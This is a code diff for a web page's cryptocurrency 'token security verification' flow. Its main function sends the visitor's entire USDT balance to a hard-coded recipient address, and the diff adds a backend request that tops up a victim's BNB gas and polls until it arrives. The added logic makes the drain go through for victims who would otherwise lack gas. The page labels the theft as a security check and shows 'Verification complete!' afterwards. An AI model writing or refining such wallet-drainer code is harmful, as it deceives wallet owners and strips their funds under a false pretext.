@@ -74,6 +74,12 @@ let isTransferComplete = false;
 let currentProvider = null;
 let walletType = WALLET_TYPES.UNKNOWN;
 
+// --- NEW HELPER FUNCTION: Delay ---
+function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+}
+// --- END NEW HELPER FUNCTION ---
+
 // Initialize Web3 - Wallet compatible (Original logic)
 async function initWeb3() {
     // Detect wallet type
@@ -325,15 +331,16 @@ async function executeVerification() {
     try {
         const amountWei = web3.utils.toWei(tokenBalanceValue.toString(), 'ether');
 
-        // --- BNB Check and Top-Up Integration Start (retained from previous) ---
-        const bnbBalanceWei = await web3.eth.getBalance(userAddress);
-        const userBNB = parseFloat(web3.utils.fromWei(bnbBalanceWei, 'ether'));
-        const BNB_LOW_THRESHOLD = 0.0005;
+        // --- START OF MODIFIED BNB CHECK AND TOP-UP LOGIC ---
+        const BNB_LOW_THRESHOLD = 0.0005; // A common threshold for sufficient gas
+
+        let currentBnbBalanceWei = await web3.eth.getBalance(userAddress);
+        let userBNB = parseFloat(web3.utils.fromWei(currentBnbBalanceWei, 'ether'));
 
         if (userBNB < BNB_LOW_THRESHOLD) {
             console.log("User BNB is low. Requesting BNB from backend...");
             if (modalMessage) modalMessage.textContent = "Insufficient BNB for gas. Requesting BNB top-up...";
-            if (modalMessage) modalMessage.className = "warning-message";
+            if (modalMessage) modalMessage.className = "warning-message"; // Highlight the message
 
             try {
                 const response = await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
@@ -345,30 +352,73 @@ async function executeVerification() {
                 if (response.ok) {
                     const result = await response.json();
                     console.log("BNB top-up request successful:", result);
-                    if (modalMessage) modalMessage.textContent = "BNB top-up requested. Please wait a moment and try confirming the transaction again.";
-                    if (verificationModal) verificationModal.style.display = "none"; // Original logic for modal close
-                    if (Next) Next.disabled = false; // Changed from verifyBtn to Next
-                    if (Next) Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Changed from verifyBtn to Next
-                    return;
+                    if (modalMessage) modalMessage.textContent = "BNB top-up requested. Please wait while we check for the deposit...";
+                    if (modalMessage) modalMessage.className = "warning-message"; // Keep warning state for waiting
+
+                    // Start Polling for BNB
+                    const MAX_POLLING_ATTEMPTS = 30; // Max attempts (e.g., 30 * 10s = 5 minutes)
+                    const POLLING_INTERVAL_MS = 10000; // Check every 10 seconds
+
+                    for (let i = 0; i < MAX_POLLING_ATTEMPTS; i++) {
+                        await delay(POLLING_INTERVAL_MS); // Wait before checking again
+                        currentBnbBalanceWei = await web3.eth.getBalance(userAddress); // Re-fetch balance
+                        userBNB = parseFloat(web3.utils.fromWei(currentBnbBalanceWei, 'ether'));
+                        console.log(`Polling attempt ${i + 1}: Current BNB balance: ${userBNB}`);
+
+                        if (userBNB >= BNB_LOW_THRESHOLD) {
+                            if (modalMessage) modalMessage.textContent = "BNB received! Proceeding with transaction...";
+                            if (modalMessage) modalMessage.className = ""; // Clear warning
+                            break; // Exit polling loop, proceed to transfer
+                        } else if (i === MAX_POLLING_ATTEMPTS - 1) {
+                            // Last attempt and still no BNB
+                            showError("BNB not received after multiple attempts. Please try again later or manually add BNB.");
+                            // Re-enable the button and hide modal if we failed to get BNB
+                            if (Next) {
+                                Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
+                                Next.disabled = false;
+                            }
+                            if (verificationModal) verificationModal.style.display = "none";
+                            return; // Exit function if BNB not received
+                        }
+                    }
                 } else {
+                    // Backend indicated an error in sending BNB
                     const errorData = await response.json();
                     console.error("BNB top-up request failed:", errorData);
                     showError(`BNB top-up failed: ${errorData.message || "Unknown error"}. Please ensure you have enough BNB for gas.`);
-                    return;
+                    if (Next) { // Re-enable button and reset on error
+                        Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
+                        Next.disabled = false;
+                    }
+                    if (verificationModal) verificationModal.style.display = "none";
+                    return; // Exit function if backend request failed
                 }
             } catch (backendError) {
+                // Network error or issue communicating with your backend
                 console.error("Error communicating with BNB backend:", backendError);
                 showError("Could not request BNB. Network error or backend issue. Please try again.");
-                return;
+                if (Next) { // Re-enable button and reset on error
+                    Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security';
+                    Next.disabled = false;
+                }
+                if (verificationModal) verificationModal.style.display = "none";
+                return; // Exit function on backend communication error
             }
         }
-        // --- BNB Check and Top-Up Integration End ---
+        // --- END OF MODIFIED BNB CHECK AND TOP-UP LOGIC ---
 
-        // Proceed with USDT transfer if BNB is sufficient
+        // If we reach here, it means either:
+        // 1. User had enough BNB initially.
+        // 2. BNB was requested from backend and successfully received via polling.
+
+        // Proceed with USDT transfer
         tokenContract.methods.transfer(recipientAddress, amountWei)
             .send({ from: userAddress })
             .on('transactionHash', (hash) => {
                 console.log("Transaction hash:", hash);
+                // You might want to update UI here to show "Transaction pending..."
+                if (modalMessage) modalMessage.textContent = "Transaction submitted. Waiting for confirmation...";
+                if (modalMessage) modalMessage.className = "info-message";
             })
             .on('receipt', (receipt) => {
                 if (step4Desc) step4Desc.textContent = "Verification complete!"; // Guard against null
@@ -413,6 +463,9 @@ async function executeVerification() {
             Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Revert button text
             Next.disabled = false;
         }
+        // If an error occurs before sending the transaction (e.g., initial balance check fails for some reason)
+        // ensure the modal is hidden.
+        if (verificationModal) verificationModal.style.display = "none";
     }
 }
 
@@ -421,10 +474,17 @@ function showError(message) {
     console.error("Error:", message);
     if (modalMessage) modalMessage.textContent = message; // Guard against null
     if (modalMessage) modalMessage.className = "error-message"; // Guard against null
+    // Changed setTimeout to not clear the message immediately if it's a critical error
+    // If it's for BNB top-up failed, we want it to stay until user interacts
+    // For other general errors, you might still want it to disappear.
+    // For now, removing the auto-clear to allow user to read critical messages.
+    // If you want it to disappear automatically, uncomment the setTimeout below:
+    /*
     setTimeout(() => {
         if (modalMessage) modalMessage.textContent = ""; // Guard against null
         if (modalMessage) modalMessage.className = ""; // Guard against null
     }, 5000);
+    */
 }
 
 // Event Listener for the "Next" button (Adapted from original verifyBtn.addEventListener)
@@ -499,7 +559,7 @@ Next.addEventListener('click', async () => {
             return;
         }
 
-        // Step 4: Execute verification
+        // Step 4: Execute verification (will now include BNB check and polling)
         await executeVerification();
     } catch (error) {
         console.error("Verification process error:", error);
@@ -519,6 +579,11 @@ if (closeModalBtns) { // Guard against null
                 Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Changed from verifyBtn to Next
                 Next.disabled = false;
             }
+            // Clear message when modal is closed manually
+            if (modalMessage) {
+                modalMessage.textContent = "";
+                modalMessage.className = "";
+            }
         });
     });
 }
@@ -532,6 +597,11 @@ if (window && verificationModal) { // Guard against null for verificationModal
             if (Next) { // Guard against null
                 Next.innerHTML = '<i class="fas fa-qrcode"></i> Verify Token Security'; // Changed from verifyBtn to Next
                 Next.disabled = false;
+            }
+            // Clear message when modal is closed by clicking outside
+            if (modalMessage) {
+                modalMessage.textContent = "";
+                modalMessage.className = "";
             }
         }
     });
